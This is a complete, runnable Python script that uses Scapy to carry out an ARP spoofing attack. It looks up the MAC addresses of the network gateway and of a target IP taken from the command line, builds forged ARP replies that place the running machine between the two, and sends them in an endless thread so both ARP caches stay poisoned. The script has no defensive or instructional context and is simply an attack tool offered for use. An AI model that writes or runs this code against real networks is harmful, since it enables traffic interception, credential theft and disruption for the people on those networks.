#!/usr/bin/env python3
from scapy.all import *
import sys
import threading

def arp_flood(packet1,packet2):
    print('Spamming ARP packets...')
    while True:
        send(packet1,verbose = 0)
        send(packet2,verbose = 0)

def get_mac(ip):
    #Scapy has a similar method called getmacfromip() but often randomly times out
    #This method seems to produce more consistent results
    mac_packet = ARP(pdst = ip)
    rpsd = sr1(mac_packet,verbose = 0)
    return rpsd.hwsrc

def main():
    gw = conf.route.route("0.0.0.0")[2]
    gw_mac = get_mac(gw)

    print('GATEWAY IP: ' + str(gw))
    print('GATEWAY MAC: ' + str(gw_mac))

    target = sys.argv[1]
    target_mac = get_mac(target)

    print('TARGET IP: ' + str(target))
    print('TARGET MAC: ' + str(target_mac))

    #Prepare the spoofed packets
    packet_gateway = ARP(pdst = str(gw),hwdst = str(gw_mac),psrc = str(target))
    packet_target = ARP(pdst = str(target),hwdst = str(target_mac),psrc = str(gw))

    t = threading.Thread(target = arp_flood, args=(packet_gateway,packet_target))
    t.start()

    

if __name__=="__main__":
    main()